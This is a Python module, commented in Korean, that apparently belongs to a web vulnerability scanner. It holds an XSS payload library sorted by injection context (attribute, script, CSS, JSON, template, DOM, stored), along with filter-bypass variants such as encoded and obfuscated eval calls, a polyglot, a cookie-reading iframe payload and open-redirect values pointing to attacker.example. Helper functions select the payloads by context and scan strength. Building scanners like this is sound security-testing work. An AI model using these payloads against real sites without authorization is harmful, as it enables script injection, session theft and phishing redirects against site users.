"""
XSS 페이로드 목록

컨텍스트 분류
  attr_value    : value="" 또는 name="" 속성값 내부
  attr_href     : href / src / action 등 URL 속성
  attr_event    : 기존 이벤트 속성 내부 (onclick="USER" 등)
  script        : <script> 블록 내부 JS 문자열
  script_raw    : <script> 블록 내부, 문자열 컨텍스트 없이 직접 코드 삽입
  html_comment  : HTML 주석 내부
  body          : HTML body 직접 삽입
  css           : style 속성 / <style> 블록 내부
  json          : JSON 응답 값 내부 (파싱 후 DOM 반영)
  template      : 서버사이드 템플릿 표현식 내부
  filter_bypass : 인코딩/공백/대소문자 우회 기법
  stored        : Stored XSS — 저장 후 별도 조회 검증용
  open_redirect : 리다이렉트 파라미터
  dom           : DOM 기반 소스→싱크 흐름

  [별칭]
  reflected     : attr_value + body + script 합산 (컨텍스트 불명 reflected XSS용)
  unknown       : body + attr_value + filter_bypass 합산 (컨텍스트 전혀 모를 때)
"""

from typing import Dict, List

from ._utils import _limit, _dedupe, STRENGTH_LIMIT

Payload = Dict[str, str]

# 1. ATTR_VALUE — value="" / name="" 속성 탈출
ATTR_VALUE: List[Payload] = [
    {"type": "REFLECTED_XSS", "family": "dq_img_onerror",      "payload": '"><img src=x onerror=alert(1)>'},
    {"type": "REFLECTED_XSS", "family": "dq_svg_onload",        "payload": '"><svg onload=alert(1)>'},
    {"type": "REFLECTED_XSS", "family": "dq_onmouseover",       "payload": '" onmouseover=alert(1) x="'},
    {"type": "REFLECTED_XSS", "family": "dq_onfocus_auto",      "payload": '" autofocus onfocus=alert(1) x="'},
    {"type": "REFLECTED_XSS", "family": "dq_oninput",           "payload": '" oninput=alert(1) x="'},
    {"type": "REFLECTED_XSS", "family": "dq_onclick",           "payload": '" onclick=alert(1) x="'},
    {"type": "REFLECTED_XSS", "family": "dq_img_backtick",      "payload": '"><img src=x onerror=alert`1`>'},
    {"type": "REFLECTED_XSS", "family": "dq_details_ontoggle",  "payload": '"><details open ontoggle=alert(1)>'},
    {"type": "REFLECTED_XSS", "family": "dq_body_onpageshow",   "payload": '"><body onpageshow=alert(1)>'},
    {"type": "REFLECTED_XSS", "family": "dq_input_onblur",      "payload": '"><input autofocus onfocus=alert(1)>'},
    {"type": "REFLECTED_XSS", "family": "dq_marquee_onstart",   "payload": '"><marquee onstart=alert(1)>xss</marquee>'},
    {"type": "REFLECTED_XSS", "family": "dq_video_onerror",     "payload": '"><video src=x onerror=alert(1)>'},
    {"type": "REFLECTED_XSS", "family": "dq_audio_onerror",     "payload": '"><audio src=x onerror=alert(1)>'},
    {"type": "REFLECTED_XSS", "family": "dq_iframe_srcdoc",     "payload": '"><iframe srcdoc="<script>alert(1)</script>">'},
    {"type": "REFLECTED_XSS", "family": "dq_object_data",       "payload": '"><object data="javascript:alert(1)">'},
    {"type": "REFLECTED_XSS", "family": "sq_img_onerror",       "payload": "'><img src=x onerror=alert(1)>"},
    {"type": "REFLECTED_XSS", "family": "sq_svg_onload",        "payload": "'><svg onload=alert(1)>"},
    {"type": "REFLECTED_XSS", "family": "sq_onmouseover",       "payload": "' onmouseover=alert(1) x='"},
    {"type": "REFLECTED_XSS", "family": "sq_onfocus_auto",      "payload": "' autofocus onfocus=alert(1) x='"},
    {"type": "REFLECTED_XSS", "family": "inline_alert_dq",      "payload": '";alert(1);//'},
    {"type": "REFLECTED_XSS", "family": "inline_alert_sq",      "payload": "';alert(1);//"},
]

# 2. ATTR_HREF — URL 속성 (href/src/action/formaction)
ATTR_HREF: List[Payload] = [
    {"type": "REFLECTED_XSS", "family": "js_protocol",          "payload": "javascript:alert(1)"},
    {"type": "REFLECTED_XSS", "family": "js_protocol_caps",     "payload": "JavaScript:alert(1)"},
    {"type": "REFLECTED_XSS", "family": "js_protocol_encoded",  "payload": "j&#97;vascript:alert(1)"},
    {"type": "REFLECTED_XSS", "family": "js_protocol_tab",      "payload": "java\tscript:alert(1)"},
    {"type": "REFLECTED_XSS", "family": "js_protocol_newline",  "payload": "java\nscript:alert(1)"},
    {"type": "REFLECTED_XSS", "family": "data_html",            "payload": "data:text/html,<script>alert(1)</script>"},
    {"type": "REFLECTED_XSS", "family": "data_html_b64",        "payload": "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="},
    {"type": "REFLECTED_XSS", "family": "vbscript",             "payload": "vbscript:alert(1)"},
    {"type": "REFLECTED_XSS", "family": "attr_break_onmouse",   "payload": '" onmouseover=alert(1) href="#'},
    {"type": "REFLECTED_XSS", "family": "attr_break_onfocus",   "payload": '" onfocus=alert(1) href="#'},
]

# 3. ATTR_EVENT — 기존 이벤트 속성 내부 탈출 (onclick="USER_INPUT" 구조)
ATTR_EVENT: List[Payload] = [
    {"type": "REFLECTED_XSS", "family": "ev_dq_break",          "payload": '";alert(1);//'},
    {"type": "REFLECTED_XSS", "family": "ev_sq_break",          "payload": "';alert(1);//"},
    {"type": "REFLECTED_XSS", "family": "ev_dq_new_handler",    "payload": '";alert(1);x="'},
    {"type": "REFLECTED_XSS", "family": "ev_backtick",          "payload": '`-alert(1)-`'},
    {"type": "REFLECTED_XSS", "family": "ev_paren_bypass",      "payload": "';alert`1`;//"},
    {"type": "REFLECTED_XSS", "family": "ev_dq_onerror_img",    "payload": '"><img src=x onerror=alert(1)>'},
]

# 4. SCRIPT — <script> 블록 내 JS 문자열 탈출
SCRIPT_CONTEXT: List[Payload] = [
    {"type": "REFLECTED_XSS", "family": "sc_dq_break",          "payload": '";alert(1);//'},
    {"type": "REFLECTED_XSS", "family": "sc_sq_break",          "payload": "';alert(1);//"},
    {"type": "REFLECTED_XSS", "family": "sc_dq_break_func",     "payload": '";alert(document.domain);//'},
    {"type": "REFLECTED_XSS", "family": "sc_sq_break_func",     "payload": "';alert(document.domain);//"},
    {"type": "REFLECTED_XSS", "family": "sc_backtick_break",    "payload": "`-alert(1)-`"},
    {"type": "REFLECTED_XSS", "family": "sc_close_reopen",      "payload": "</script><script>alert(1)</script>"},
    {"type": "REFLECTED_XSS", "family": "sc_close_img",         "payload": "</script><img src=x onerror=alert(1)>"},
    {"type": "REFLECTED_XSS", "family": "sc_plus_concat",       "payload": "'+alert(1)+'"},
    {"type": "REFLECTED_XSS", "family": "sc_comma_op",          "payload": "',alert(1),'"},
    {"type": "REFLECTED_XSS", "family": "sc_throw_onerror",     "payload": "';throw/**/onerror=alert,1;//"},
]

# 5. SCRIPT_RAW — <script> 내부 직접 삽입 (문자열 컨텍스트 없음)
SCRIPT_RAW: List[Payload] = [
    {"type": "REFLECTED_XSS", "family": "raw_alert",            "payload": "alert(1)"},
    {"type": "REFLECTED_XSS", "family": "raw_eval_encoded",     "payload": "eval('\\x61lert\\x281\\x29')"},
    {"type": "REFLECTED_XSS", "family": "raw_fn_constructor",   "payload": "Function('ale'+'rt(1)')()"},
    {"type": "REFLECTED_XSS", "family": "raw_timeout",          "payload": "setTimeout(alert,0,1)"},
    {"type": "REFLECTED_XSS", "family": "raw_paren_bypass",     "payload": "alert`1`"},
    {"type": "REFLECTED_XSS", "family": "raw_location",         "payload": "location='javascript:alert(1)'"},
    {"type": "REFLECTED_XSS", "family": "raw_document_write",   "payload": "document.write('<script>alert(1)<\\/script>')"},
]

# 6. HTML_COMMENT — <!-- USER --> 주석 탈출
HTML_COMMENT: List[Payload] = [
    {"type": "REFLECTED_XSS", "family": "cmt_img",              "payload": "--><img src=x onerror=alert(1)><!--"},
    {"type": "REFLECTED_XSS", "family": "cmt_svg",              "payload": "--><svg onload=alert(1)><!--"},
    {"type": "REFLECTED_XSS", "family": "cmt_script",           "payload": "--><script>alert(1)</script><!--"},
    {"type": "REFLECTED_XSS", "family": "cmt_ie_cond",          "payload": "--><![if]><img src=x onerror=alert(1)><!-->"},
]

# 7. BODY — HTML body 직접 삽입
# 앞 3개는 ZAP GENERIC_SCRIPT_ALERT_LIST 순서 기준 — LOW 강도(4개)일 때 핵심 프로브가 먼저 나가도록 배치
BODY: List[Payload] = [
    {"type": "REFLECTED_XSS", "family": "zap_script_mixed",     "payload": "<scrIpt>alert(1);</scRipt>"},
    {"type": "REFLECTED_XSS", "family": "img_onerror",          "payload": "<img src=x onerror=alert(1)>"},
    {"type": "REFLECTED_XSS", "family": "img_onerror_prompt",   "payload": "<img src=x onerror=prompt()>"},
    {"type": "REFLECTED_XSS", "family": "svg_onload",           "payload": "<svg onload=alert(1)>"},
    {"type": "REFLECTED_XSS", "family": "img_onerror_backtick", "payload": "<img src=x onerror=alert`1`>"},
    {"type": "REFLECTED_XSS", "family": "img_src_jsproto",      "payload": '<img src="javascript:alert(1)">'},
    {"type": "REFLECTED_XSS", "family": "svg_slash_onload",     "payload": "<svg/onload=alert(1)>"},
    {"type": "REFLECTED_XSS", "family": "svg_anim",             "payload": "<svg><animate onbegin=alert(1) attributeName=x></animate></svg>"},
    {"type": "REFLECTED_XSS", "family": "b_mouseover",          "payload": "<b onMouseOver=alert(1);>test</b>"},
    {"type": "REFLECTED_XSS", "family": "script_tag",           "payload": "<script>alert(1)</script>"},
    {"type": "REFLECTED_XSS", "family": "script_src_data",      "payload": "<script src=data:,alert(1)></script>"},
    {"type": "REFLECTED_XSS", "family": "body_onload",          "payload": "<body onload=alert(1)>"},
    {"type": "REFLECTED_XSS", "family": "input_autofocus",      "payload": "<input autofocus onfocus=alert(1)>"},
    {"type": "REFLECTED_XSS", "family": "details_ontoggle",     "payload": "<details open ontoggle=alert(1)>"},
    {"type": "REFLECTED_XSS", "family": "video_onerror",        "payload": "<video src=x onerror=alert(1)>"},
    {"type": "REFLECTED_XSS", "family": "audio_onerror",        "payload": "<audio src=x onerror=alert(1)>"},
    {"type": "REFLECTED_XSS", "family": "iframe_js",            "payload": '<iframe src="javascript:alert(1)">'},
    {"type": "REFLECTED_XSS", "family": "iframe_srcdoc",        "payload": '<iframe srcdoc="<script>alert(1)</script>">'},
    {"type": "REFLECTED_XSS", "family": "form_action_js",       "payload": "<form action=javascript:alert(1)><input type=submit>"},
    {"type": "REFLECTED_XSS", "family": "math_annotation",      "payload": "<math><annotation encoding=\"text/html\"><script>alert(1)</script></annotation></math>"},
    {"type": "REFLECTED_XSS", "family": "object_data_js",       "payload": '<object data="javascript:alert(1)">'},
    {"type": "REFLECTED_XSS", "family": "marquee_onstart",      "payload": "<marquee onstart=alert(1)>xss</marquee>"},
]

# 8. CSS — style 속성 / <style> 블록
CSS: List[Payload] = [
    {"type": "REFLECTED_XSS", "family": "css_expr_ie",          "payload": '<style>*{x:expression(alert(1))}</style>'},
    {"type": "REFLECTED_XSS", "family": "css_import_js",        "payload": "@import 'javascript:alert(1)';"},
    {"type": "REFLECTED_XSS", "family": "css_bg_url_js",        "payload": "background:url(javascript:alert(1))"},
    {"type": "REFLECTED_XSS", "family": "css_break_style",      "payload": '}</style><img src=x onerror=alert(1)>'},
    {"type": "REFLECTED_XSS", "family": "css_break_attr",       "payload": '};alert(1);//'},
]

# 9. JSON — JSON 응답값이 DOM에 반영되는 경우
JSON_CONTEXT: List[Payload] = [
    {"type": "REFLECTED_XSS", "family": "json_dq_close",        "payload": '","<script>alert(1)</script>":"'},
    {"type": "REFLECTED_XSS", "family": "json_script_tag",      "payload": "</script><script>alert(1)</script>"},
    {"type": "REFLECTED_XSS", "family": "json_unicode_lt",      "payload": r'<script>alert(1)</script>'},
    {"type": "REFLECTED_XSS", "family": "json_html_entity",     "payload": "&lt;script&gt;alert(1)&lt;/script&gt;"},
]

# 10. TEMPLATE — 서버사이드/클라이언트 템플릿 표현식
TEMPLATE: List[Payload] = [
    {"type": "REFLECTED_XSS", "family": "ng_expression",        "payload": "{{constructor.constructor('alert(1)')()}}"},
    {"type": "REFLECTED_XSS", "family": "ng_filter",            "payload": "{{7*7}}"},
    {"type": "REFLECTED_XSS", "family": "vue_expression",       "payload": "{{_c.constructor('alert(1)')()}}"},
    {"type": "REFLECTED_XSS", "family": "hbs_triple",           "payload": "{{{<script>alert(1)</script>}}}"},
    {"type": "REFLECTED_XSS", "family": "jinja2_print",         "payload": "{{7*7}}"},
]

# 11. FILTER_BYPASS — 필터 우회 기법
FILTER_BYPASS: List[Payload] = [
    # ZAP: C/C++ 기반 서버의 validator가 \0 이후를 검사 안 하는 경우 우회
    # requests 전송 시 \0 → %00으로 URL 인코딩되어 전달됨
    {"type": "REFLECTED_XSS", "family": "null_byte_script",     "payload": "\0<scrIpt>alert(1);</scRipt>"},
    {"type": "REFLECTED_XSS", "family": "mixed_case_img",       "payload": "<ImG sRc=x OnErRoR=alert(1)>"},
    {"type": "REFLECTED_XSS", "family": "mixed_case_script",    "payload": "<ScRiPt>alert(1)</ScRiPt>"},
    {"type": "REFLECTED_XSS", "family": "tab_sep",              "payload": "<img\tsrc=x\tonerror=alert(1)>"},
    {"type": "REFLECTED_XSS", "family": "newline_sep",          "payload": "<img\nsrc=x\nonerror=alert(1)>"},
    {"type": "REFLECTED_XSS", "family": "slash_sep",            "payload": "<img/src=x/onerror=alert(1)>"},
    {"type": "REFLECTED_XSS", "family": "double_url_enc",       "payload": "%253Cscript%253Ealert(1)%253C/script%253E"},
    {"type": "REFLECTED_XSS", "family": "url_encoded_lt_gt",    "payload": "%3Cscript%3Ealert(1)%3C/script%3E"},
    {"type": "REFLECTED_XSS", "family": "entity_onerror",       "payload": "<img src=x onerror&#61;alert(1)>"},
    {"type": "REFLECTED_XSS", "family": "backtick_paren",       "payload": "<img src=x onerror=alert`1`>"},
    {"type": "REFLECTED_XSS", "family": "comment_between",      "payload": "<img src=x o/**/nerror=alert(1)>"},
    {"type": "REFLECTED_XSS", "family": "svg_xml_entity",       "payload": '<svg><script>alert&lpar;1&rpar;</script></svg>'},
    {"type": "REFLECTED_XSS", "family": "fromcharcode",         "payload": "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>"},
    {"type": "REFLECTED_XSS", "family": "b64_eval",             "payload": "<script>eval(atob('YWxlcnQoMSk='))</script>"},
    {"type": "REFLECTED_XSS", "family": "onpointerover",        "payload": '<p onpointerover=alert(1)>hover me</p>'},
    {"type": "REFLECTED_XSS", "family": "no_quote_event",       "payload": "<img src=x onerror=alert(1) >"},
]

# 12. STORED — Stored XSS (저장 후 별도 페이지에서 실행)
STORED: List[Payload] = [
    {"type": "STORED_XSS", "family": "st_script_basic",         "payload": "<script>alert(document.domain)</script>"},
    {"type": "STORED_XSS", "family": "st_img_onerror",          "payload": "<img src=x onerror=alert(document.domain)>"},
    {"type": "STORED_XSS", "family": "st_svg_onload",           "payload": "<svg onload=alert(document.domain)>"},
    {"type": "STORED_XSS", "family": "st_short_img",            "payload": "<img/onerror=alert(1) src=x>"},
    {"type": "STORED_XSS", "family": "st_short_svg",            "payload": "<svg/onload=alert(1)>"},
    {"type": "STORED_XSS", "family": "st_iframe_exfil",         "payload": "<iframe src=javascript:alert(document.cookie)>"},
    {"type": "STORED_XSS", "family": "st_md_link",              "payload": "[xss](javascript:alert(1))"},
    {"type": "STORED_XSS", "family": "st_html_attr",            "payload": '"><img src=x onerror=alert(1) x="'},
    {"type": "STORED_XSS", "family": "st_input_focus",          "payload": "<input autofocus onfocus=alert(1)>"},
    {"type": "STORED_XSS", "family": "st_details_toggle",       "payload": "<details open ontoggle=alert(document.domain)>"},
    {"type": "STORED_XSS", "family": "st_polyglot",             "payload": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e"},
]

# 13. OPEN_REDIRECT — 리다이렉트 파라미터
OPEN_REDIRECT: List[Payload] = [
    {"type": "OPEN_REDIRECT", "family": "external_http",        "payload": "https://attacker.example/"},
    {"type": "OPEN_REDIRECT", "family": "external_proto_rel",   "payload": "//attacker.example/"},
    {"type": "OPEN_REDIRECT", "family": "js_protocol_redirect", "payload": "javascript:alert(1)"},
    {"type": "OPEN_REDIRECT", "family": "data_redirect",        "payload": "data:text/html,<script>alert(1)</script>"},
    {"type": "OPEN_REDIRECT", "family": "double_slash",         "payload": "\\\\attacker.example"},
    {"type": "OPEN_REDIRECT", "family": "triple_slash",         "payload": "///attacker.example/"},
]

# 14. DOM_SINK — DOM 기반 소스→싱크 흐름
DOM_SINK: List[Payload] = [
    {"type": "DOM_XSS", "family": "hash_img",                   "payload": "#<img src=x onerror=alert(1)>"},
    {"type": "DOM_XSS", "family": "hash_svg",                   "payload": "#<svg onload=alert(1)>"},
    {"type": "DOM_XSS", "family": "inner_html",                 "payload": "<img src=x onerror=alert(1)>"},
    {"type": "DOM_XSS", "family": "eval_concat",                "payload": "'-alert(1)-'"},
]


# context 이름 → 페이로드 목록
CONTEXT_MAP: Dict[str, List[Payload]] = {
    "attr_value":    ATTR_VALUE,
    "attr_href":     ATTR_HREF,
    "attr_event":    ATTR_EVENT,
    "script":        SCRIPT_CONTEXT,
    "script_raw":    SCRIPT_RAW,
    "html_comment":  HTML_COMMENT,
    "body":          BODY,
    "css":           CSS,
    "json":          JSON_CONTEXT,
    "template":      TEMPLATE,
    "filter_bypass": FILTER_BYPASS,
    "stored":        STORED,
    "open_redirect": OPEN_REDIRECT,
    "dom":           DOM_SINK,
    # 별칭 — 컨텍스트를 모를 때 사용
    "reflected":     _dedupe([ATTR_VALUE, BODY, SCRIPT_CONTEXT]),
    "unknown":       _dedupe([BODY, ATTR_VALUE, FILTER_BYPASS]),
    "none":          [],
}


def get_by_context(context: str, strength: str = "MEDIUM") -> List[Payload]:
    """컨텍스트 이름으로 페이로드 반환 (강도 제한 적용)"""
    payloads = CONTEXT_MAP.get(context.lower(), BODY)
    return _limit(payloads, strength)


def get_all() -> List[Payload]:
    """모든 XSS 페이로드 중복 제거 후 반환"""
    return _dedupe([
        ATTR_VALUE, ATTR_HREF, ATTR_EVENT, SCRIPT_CONTEXT, SCRIPT_RAW,
        HTML_COMMENT, BODY, CSS, JSON_CONTEXT, TEMPLATE,
        FILTER_BYPASS, STORED, OPEN_REDIRECT, DOM_SINK,
    ])


def get_by_strength(strength: str = "MEDIUM") -> List[Payload]:
    """컨텍스트 불명 시 강도 기반 범용 페이로드 반환"""
    pool = _dedupe([BODY, ATTR_VALUE, FILTER_BYPASS, SCRIPT_CONTEXT, STORED])
    return _limit(pool, strength)


def get_by_type(vuln_type: str) -> List[Payload]:
    """타입(REFLECTED_XSS / STORED_XSS / DOM_XSS / OPEN_REDIRECT) 필터링"""
    t = vuln_type.upper()
    return [p for p in get_all() if p["type"] == t]


if __name__ == "__main__":
    all_payloads = get_all()
    print(f"총 페이로드 수: {len(all_payloads)}")
    by_type: Dict[str, int] = {}
    for p in all_payloads:
        by_type[p["type"]] = by_type.get(p["type"], 0) + 1
    for t, cnt in sorted(by_type.items()):
        print(f"  {t}: {cnt}개")
    print()
    print("[reflected 컨텍스트 MEDIUM 강도]")
    for p in get_by_context("reflected", "MEDIUM"):
        print(f"  [{p['family']}] {p['payload']}")
